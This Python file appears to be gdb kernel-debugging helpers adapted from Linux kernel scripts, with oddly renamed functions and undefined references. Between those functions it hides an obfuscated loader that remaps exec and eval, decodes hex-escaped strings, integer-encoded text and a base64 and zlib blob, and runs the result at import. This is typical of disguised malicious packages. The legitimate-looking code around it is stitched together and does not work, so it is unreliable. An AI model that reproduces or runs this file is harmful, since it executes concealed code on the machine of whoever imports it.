#pip install pycryptodome  , It works only v3.11.5 Above.
import random ,base64,codecs,zlib,sys;py=""
sys.setrecursionlimit(1000000000) 
 
def genrataPassOSN():
    if utils.get_gdbserver_type() == utils.GDBSERVER_QEMU:
        return gdb.selected_thread().num - 1
    elif utils.get_gdbserver_type() == utils.GDBSERVER_KGDB:
        tid = gdb.selected_thread().ptid[2]
        if tid > (0x100000000 - MAX_CPUS - 2):
            return 0x100000000 - tid - 2
        else:
            return tasks.get_thread_info(tasks.get_task_by_pid(tid))['cpu']
    else:
        raise gdb.GdbError("Sorry, obtaining the current CPU is not yet "
                           "supported with this gdb server.")

def per_capito(var_ptr, cpu):
    if cpu == -1:
        cpu = get_current_cpu()
    if utils.is_target_arch("sparc:v9"):
        offset = gdb.parse_and_eval(
            "trap_block[{0}].__per_cpu_base".format(str(cpu)))
    else:
        try:
            offset = gdb.parse_and_eval(
                "__per_cpu_offset[{0}]".format(str(cpu)))
        except gdb.error:
            # !CONFIG_SMP case
            offset = 0
    pointer = var_ptr.cast(utils.get_long_type()) + offset
    return pointer.cast(var_ptr.type).dereference()


pyobfuscate = (lambda **kwargs: (list(kwargs.keys()),list(kwargs.values())))(**{'https://pyobfuscate.com':'ResourceWarning & type','exec':'Z6zdYb08ipdEj0wFmSkBAwtaoMzdlNy2CpSaovcOGAXYFBiWD5yqNNs2RuLkjqJusKFcnNCND7zDcN0n','eval': bytes.fromhex('''0228c316b1d1c8ba3bbe6fe7fb74f17e0215c353cadb2fcce82e40f2e31993715b001d9a69dcf83154ebe1fb63e5f668ef42925d3163638178e140b549734a6e62323e259961d5a351aaaf53eefab9820f7efa8aa26e984a43f1b6556c75b3ca1edaab0739738ea61eb87f27c6261ca96d31436d766d49854438e7b5bfee07ef390376b36bee48aff83e5445388edbf0de5059fe226e12ff578027ba6d1d4d76d79f6ae4093c878418b3a7ea9eb14788f393076fd2a80042f0c10b4b83285d1fd74f40553fcb4b12a2e950223a3695bc86f7909905248b9d281c79315470fa403d247b3e89725d51348dd7bad6fce1cc43da5ee3b01227698b0c52e89035f19e173c34bb05f456a99bed24d00ab1b19deaeffb4d6ed54784b843c3f7f33e91f3d41b27e40737dbb6c28ac3cbb508a8ba3fbf0ab43086bb881beb9da6a056f4eebd285b4d0051c9716f06bbf03d22eb021cf46903a5a622250d4a2010739103133face46e0377c1a31e63b204712d6b05cfc6f6e15b462dc7ae6eafdb26804666edec236f2d3bc7aed8dfe4ae397170a6406cdbee373afedfed72420e5ca2b60f3fa53c4d13024b2e1666cea248e2201d3efe9a506a14b04ae42d66480919d19eea5b9d7bfbe4d8157632470b2055b982fb536e7befd1a38f2b68be9c8e305e0204c5dfcdf5d1a71dd3113efe753f1cbd06c09f33a9163aa4192b82343fb6b94f5ca32df90c445a14be5341db1b730d5db04315e61491b912452d6dc9adcb1380042faf8d1b5dd9fd47ba8b6903f7ee39bd54e549a16f5daa06d3adaa1a8206e5e2a20d24e5ad7d253d4738259b47d851c4a84f2d1a9a5c43a1df8cdcecc9a75c498694e00acc6f4fd2c2030aa9b70da786bcf9b321aae678cd59945dabccc4d3'''.replace("\n","")) })


def mask_validation(event):
    global cpu_mask
    cpu_mask = {}
    gdb.events.stop.disconnect(cpu_mask_invalidate)
    if hasattr(gdb.events, 'new_objfile'):
        gdb.events.new_objfile.disconnect(cpu_mask_invalidate)



_=lambda OO00000OOO0000OOO,c_int=100000:(_OOOO00OO0O00O00OO:=''.join(chr(int(int(OO00000OOO0000OOO.split()[OO00O0OO00O0O0OO0])/random.randint(1,c_int)))for OO00O0OO00O0O0OO0 in range(len(OO00000OOO0000OOO.split()))));eval("".join(chr(i) for i in [101,120,101,99]))("\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x5f\x22\x2c\x70\x72\x69\x6e\x74\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x22\x2c\x65\x78\x65\x63\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x22\x2c\x65\x76\x61\x6c\x29");__='678600 11208268 10597896 12057529 1265792 934360 80032 3073984 63072 1774848 9991104 533178 8250963 7041836 608160 1378716 4853656 6426988 10697427 7267152 5350605 7131216 5225140 416768 383880 3814019 11145344 5443329 9208350 6917196 968576 9881717 211494 1515424 520320 6949608 6294960 2837241 3750130 5824896 9919276 3626276 399690 113216 3124384 2099072 3100416 5691840 8320176 9517620 4504060 1984412 1384560 965532 1450400 925680 3854928 1630816 7744485 8130540 1160925 115536 3993199 1713636 507276 1669184 11043408 893547 4553787 8650512 104939 6157445 4958420 7855305 2061556 3034697 971730 1234176 1513056 388512 3032320 10024560 7429950 3401328 566280 6794700 2998920 2514368 9120272 9013296 3150594 10711445 1949020 2767424 6670023 10450990 1007460 3469855 10832166 1702240 8720068 3099231 3097344 1398244 4565040 1307565 8637360 1993012 3899264 572860 2101632 2914912 1279456 544128 4710034 10445520 543060 7937184 1315000 191265 314180 9711958 3868560 3686500 5633793 1277240 3599541 6963849 5955208 653880 1319404 8646560 10152784 4246992 10328416 7006720 2520738 879229 2129429 4504192 6522021 10090344 8907710 9542916 5228613 5581525 2067912 7175187 6121900 8768315 433228 6416190 10257954 7237164 1542963 753872 11818554 3374900 1720435 10695138 10887395 2721432 726064 5089616 10680840 4263812 663646 2467585 892170 3848300 5709833 10114680 725116 242023 879110';why,are,you,reading,this,thing,huh="\x5f\x5f\x5f\x5f","\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f","\x28\x22\x22\x2e\x6a\x6f","\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c","\x31\x30\x31\x2c\x39\x39","\x5f\x5f\x29\x29","\x5d\x29\x29\x28\x5f\x28";b='eJxzzPXLcSwvMHJyDzN2zI3KjsotMYkqLzABAGSkCCw=';____("".join (chr (int (OO00O0OO00O0O0OO00 /2 ))for OO00O0OO00O0O0OO00 in [202 ,240 ,202 ,198 ] if _____!=______))(f'\x5f\x5f\x5f\x5f\x28\x22\x22\x2e\x6a\x6f\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c\x31\x30\x31\x2c\x39\x39\x5d\x29\x29({____(base64.b64decode(codecs.decode(zlib.decompress(base64.b64decode(b"eJw9kMtugzAURH8pOKCGpSPiBoOjIFxj2AFteIRXWhtsf33dtOruzGikmXuzYSlZmcnZnLoZeSPBoeKp/xU5hyo26Uhe411uGID0pGPgK4LkNgPL+6IlNHwyf6tvE2Z/2ukXE47LINc4ghpuQRtv8e4/S1nNkacIhh2h54qje/+JvPcZ6JZTWC2rrOcyqCZ0cDlSghh/YFSJCbsCj+perL04JsLNrxev2MSNJYX348Hk4kZI1bkJ29+dwvao+ghCl+CiegDp8b3uHqiRizl/2I2SUN2SodlNVI8cSGe6Ptl66mUxqb3Hb/ISaoKDqkBqzeyvvgEFpGq5")).decode(),"".join(chr(int(i/8)) for i in [912, 888, 928, 392, 408])).encode()))})')


def flow_Inverter(mask_name):
    global cpu_mask
    mask = None
    if mask_name in cpu_mask:
        mask = cpu_mask[mask_name]
    if mask is None:
        mask = gdb.parse_and_eval(mask_name + ".bits")
        if hasattr(gdb, 'events'):
            cpu_mask[mask_name] = mask
            gdb.events.stop.connect(cpu_mask_invalidate)
            if hasattr(gdb.events, 'new_objfile'):
                gdb.events.new_objfile.connect(cpu_mask_invalidate)
    bits_per_entry = mask[0].type.sizeof * 8
    num_entries = mask.type.sizeof * 8 / bits_per_entry
    entry = -1
    bits = 0

    while True:
        while bits == 0:
            entry += 1
            if entry == num_entries:
                return
            bits = mask[entry]
            if bits != 0:
                bit = 0
                break

        while bits & 1 == 0:
            bits >>= 1
            bit += 1

        cpu = entry * bits_per_entry + bit

        bits >>= 1
        bit += 1

        yield int(cpu)


def each_onlineUSS():
    for cpu in cpu_list("__cpu_online_mask"):
        yield cpu


def each_present_maximi():
    for cpu in cpu_list("__cpu_present_mask"):
        yield cpu


def each_possible_fuiid():
    for cpu in cpu_list("__cpu_possible_mask"):
        yield cpu


def deosHelper():
    for cpu in cpu_list("__cpu_active_mask"):
        yield cpu



def get_current_task(cpu):
    task_ptr_type = task_type.get_type().pointer()

    if utils.is_target_arch("x86"):
        if gdb.lookup_global_symbol("cpu_tasks"):
            # This is a UML kernel, which stores the current task
            # differently than other x86 sub architectures
            var_ptr = gdb.parse_and_eval("(struct task_struct *)cpu_tasks[0].task")
            return var_ptr.dereference()
        else:
            var_ptr = gdb.parse_and_eval("&pcpu_hot.current_task")
            return per_cpu(var_ptr, cpu).dereference()
    elif utils.is_target_arch("aarch64"):
        current_task_addr = gdb.parse_and_eval("$SP_EL0")
        if (current_task_addr >> 63) != 0:
            current_task = current_task_addr.cast(task_ptr_type)
            return current_task.dereference()
        else:
            raise gdb.GdbError("Sorry, obtaining the current task is not allowed "
                               "while running in userspace(EL0)")
    elif utils.is_target_arch("riscv"):
        current_tp = gdb.parse_and_eval("$tp")
        scratch_reg = gdb.parse_and_eval("$sscratch")

        # by default tp points to current task
        current_task = current_tp.cast(task_ptr_type)

        # scratch register is set 0 in trap handler after entering kernel.
        # When hart is in user mode, scratch register is pointing to task_struct.
        # and tp is used by user mode. So when scratch register holds larger value
        # (negative address as ulong is larger value) than tp, then use scratch register.
        if (scratch_reg.cast(utils.get_ulong_type()) > current_tp.cast(utils.get_ulong_type())):
            current_task = scratch_reg.cast(task_ptr_type)

        return current_task.dereference()
    else:
        raise gdb.GdbError("Sorry, obtaining the current task is not yet "
                           "supported with this arch")


